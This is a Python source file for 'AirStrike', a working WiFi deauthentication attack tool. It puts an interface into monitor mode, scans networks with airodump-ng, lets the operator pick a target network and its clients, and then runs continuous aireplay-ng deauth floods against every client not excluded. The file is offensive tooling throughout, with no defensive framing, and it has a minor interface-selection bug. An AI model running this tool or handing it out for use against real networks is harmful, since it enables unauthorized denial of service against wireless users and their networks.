import os
from datetime import datetime
import shutil
import subprocess
import re
import time
import csv
import threading

# Colors
light_green = "\033[38;5;120m"
cyan = "\033[1;36m"
red = "\033[1;31m"
green = "\033[38;5;82m"
yellow = "\033[1;33m"
white = "\033[39m"
blue = "\033[1;34m"
purple = "\033[1;35m"
teal = "\033[38;5;37m"
reset = "\033[0m"


logo = teal + r"""
########################################
  ___  _      _____ _        _ _        
 / _ \(_)    /  ___| |      (_) |       
/ /_\ \_ _ __\ `--.| |_ _ __ _| | _____ 
|  _  | | '__|`--. \ __| '__| | |/ / _ \
| | | | | |  /\__/ / |_| |  | |   <  __/
\_| |_/_|_|  \____/ \__|_|  |_|_|\_\___|
                                        
########################################                          
""" + reset + "\n\n"


def check_sudo():
    """Verify sudo privileges."""
    if not "SUDO_UID" in os.environ.keys():
        print(f"{red}[!] Please run the tool with sudo privileges.{reset}")
        exit()

def backup_csv():
    """Backup old CSV files from previous runs."""
    for file_name in os.listdir():
        if ".csv" in file_name:
            print(f"{yellow}[!]{reset} Moving old .csv files in the backup folder.")
            cwd = os.getcwd()
            if not os.path.exists("backup"):
                os.mkdir("backup")
            timestam = datetime.now()
            shutil.move(file_name, f"{cwd}/backup/{str(timestam)}_{file_name}")

def get_wifi_int():
    """List available WiFi interfaces"""
    wlan_pattern = re.compile(r"\bwlan[0-9]+\b")
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    net_int = wlan_pattern.findall(result)
    if len(net_int) == 0 or not net_int:
        print(f"{red}[!] No WiFi interfaces found.{reset} ")
        exit()
    else:
        print(f"\n{green}[+]{reset} The following WiFi interfaces are available:")
        for index, item in enumerate(net_int):
            print(f"{purple}[{index}]{reset} {cyan}{item}{reset}")
        while True:
            try:
                choice = int(input(f"\n{yellow}[>]{reset} Please select the interface you want to use for the attack: ").strip())
                if 0 <= choice <= len(net_int) - 1:
                    print(f"{green}[+] {net_int[choice]} connected.{reset}")
                    break
                else:
                    print(f"{red}[!]{reset} Please enter a number that corresponds with the choises available.")
            except ValueError as e:
                print(f"{red}[!] VallueError: {e}{reset}")
        return net_int[choice - 1]
        
def set_monitor_mode(inf):
    """Switch interface in monitor mode."""
    try:
        print(f"{yellow}[*]{reset} Switching to 'monitor' mode...")
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        subprocess.run(["ip", "link", "set", inf, "down"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["iwconfig", inf, "mode", "monitor"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["ip", "link", "set", inf, "up"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        mode = subprocess.run(["iw", "dev", inf, "info"], capture_output=True).stdout.decode()
        if "monitor" not in mode.lower():
            raise Exception(f"Failed to switch. Make sure your adaptor supports 'monitor' mode")
        else:
            print(f"{green}[+] {inf} switched to 'monitor' mode successfully.{reset}\n")
    except Exception as e:
        print(f"{red}[!] Error switching to 'monitor' mode: {e}{reset}")

def check_for_essid(essid, lst):
    """Check if an ESSID is already in the list of networks."""
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
    return check_status

def scan_networks(inf):
    """Select band and run airodump-ng to discover networks."""
    try:
        wifi_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (all bands, will be slower)"]
        print(f"\n{yellow}[?]{reset} Please select the frequency you want to scan {cyan}(verify that your adapter supports 5GHz if chosen){reset}:")
        for idx, band in enumerate(wifi_bands):
            print(f"{purple}[{idx}]{reset} {cyan}{band}{reset}")
        while True:
            try:
                choice = int(input(f"\n{yellow}[>]{reset} Your choice (0-2): ").strip())
                if 0 <= choice <= len(wifi_bands) - 1:
                    freq = wifi_bands[choice].split(" ")[0].strip()
                    break
                else:
                    raise ValueError("Please make a valid selection.")
            except ValueError as e:
                print(f"{red}[!] {e}{reset}")
        print(f"{green}[+] Scanning {wifi_bands[choice]}....{reset}\n")
        if inf and freq:
            subprocess.Popen(["airodump-ng", "--band", freq, "-w", "scan", "--write-interval", "1", "--output-format", "csv", inf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (Exception) as e:
        print(f"{red}[!] Scan networks failed: {e}{reset}")

def parse_wifi_networks():
    """Display a menu of available Wi-Fi networks and make the choice."""
    active_wireless_networks = list()
    try:
        while True:
            os.system("clear")
            for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name and file_name.startswith("scan"):
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
 
            print(f"{yellow}[*]{reset} Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print(f"{light_green}No |\tBSSID              |\tChannel|\tPower |\t\tESSID                         |{reset}")
            print(f"{light_green}___|\t___________________|\t_______|\t______|\t\t______________________________|{reset}")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['Power'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{yellow}[+]{reset} Ready to make choice.")

    while True:
        try:
            net_choice = input(f"\n{yellow}[>]{reset} Please select a network from above: ")
            if active_wireless_networks[int(net_choice)]:
                return active_wireless_networks[int(net_choice)]
            else:
                raise ValueError("Invalid choice.")
        except ValueError as e:
            print(f"{red}[!] Error network choice: {e}{reset}")

def get_clients(wifi_ssid, wifi_channel, inter):
    """Capture clients on target network."""
    subprocess.Popen(["airodump-ng", "--bssid", wifi_ssid, "--channel", wifi_channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", inter],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_clients = set()
    clients_to_deauth = list()
    try:
        while True:
                os.system("clear")
                for file_name in os.listdir():
                    fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
                    if ".csv" in file_name and file_name.startswith("clients"):
                        with open(file_name) as csv_h:
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for index, row in enumerate(csv_reader):
                                if index < 3:
                                    pass
                                else:
                                    active_clients.add(row["Station MAC"])
                print(f"{yellow}[*]{reset} Scanning clients. Press Ctrl+C when you want to select clients to exclude from attack.\n")
                print(f"{light_green}Station MAC           |{reset}")
                print(f"{light_green}______________________|{reset}")
                for item in active_clients:
                    print(f"{item}")
                time.sleep(1)
    except KeyboardInterrupt:
        excluded_clients = filter_clients()
    for client in active_clients:
        if client in excluded_clients:
            pass
        else:
            clients_to_deauth.append(client)
    return clients_to_deauth

def filter_clients():
    """Exclude whitelisted MACs from attack."""
    mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
    excluded_macs = []
    while True:
        try:
            print(f"\n{yellow}[-]{reset} Enter MACs to exclude (comma-separated) or leave empty to attack all.")
            macs = input(f"{yellow}[>]{reset} Your choices {cyan}ie 00:11:22:33:44:55,11:22:33:44:55:66{reset} :\n").strip()
            if not macs:
                print(f"{green}[!]{reset} You will attack all the clients.")
                return []
            macs_list = list(macs.split(","))
            for mac in macs_list:
                if not mac_address_regex.match(mac.strip()):
                    raise ValueError("One or more MAC adresses have invalid format.")
            excluded_macs = mac_address_regex.findall(macs)
            if len(excluded_macs) > 0:
                excluded_macs = [mac.upper() for mac in excluded_macs]
                print(f"{yellow}[*]{reset} Excluded macs:")
                for m in excluded_macs:
                    print(f"    {purple}{m}{reset}")
                return excluded_macs
        except (Exception, ValueError) as e:
            print(f"{red}[!] Error filtering clients: {e}{reset}")

def deauth_attack(network_mac, target_mac, interface):
    """Deauth attack on selected clients."""
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])

def restore_managed_mode(inf):
    """Revert interface to default managed mode."""
    try:
        print(f"{yellow}[*]{reset} Switching to default 'managed' mode...")
        subprocess.run(["ip", "link", "set", inf, "down"], check=True)
        time.sleep(2)
        subprocess.run(["iw", inf, "set", "type", "managed"], check=True)
        time.sleep(1)
        subprocess.run(["ip", "link", "set", inf, "up"], check=True)
        time.sleep(1)
        subprocess.run(["service", "NetworkManager", "start"], check=True)
        mode = subprocess.run(["iw", "dev", inf, "info"], capture_output=True).stdout.decode()
        if "managed" not in mode.lower():
            raise Exception(f"Failed to switch to 'managed' mode")
        else:
            print(f"{green}[+] {inf} switched to 'managed' mode successfully.{reset}\n")
    except Exception as e:
        print(f"{red}[!] Error switching to 'managed' mode: {e}{reset}")

def main():
    os.system("clear")
    print(logo)
    check_sudo()
    backup_csv()
    inter = get_wifi_int()
    set_monitor_mode(inter)
    scan_networks(inter)
    wifi_network_choice = parse_wifi_networks()
    hackbssid = wifi_network_choice["BSSID"]
    hackchannel = wifi_network_choice["channel"].strip()
    clients_to_deauth = get_clients(hackbssid, hackchannel, inter)

    subprocess.run(["airmon-ng", "start", inter, hackchannel])
    
    threads = []
    
    time.sleep(2)
    for client in clients_to_deauth:
        t = threading.Thread(target=deauth_attack, args=[hackbssid, client, inter], daemon=True)
        time.sleep(1)
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(0.1)

    except KeyboardInterrupt:
        print(f"\n{purple}[#]{reset} Stopping Deauth..")
        restore_managed_mode(inter)

    

if __name__ == "__main__":
    main()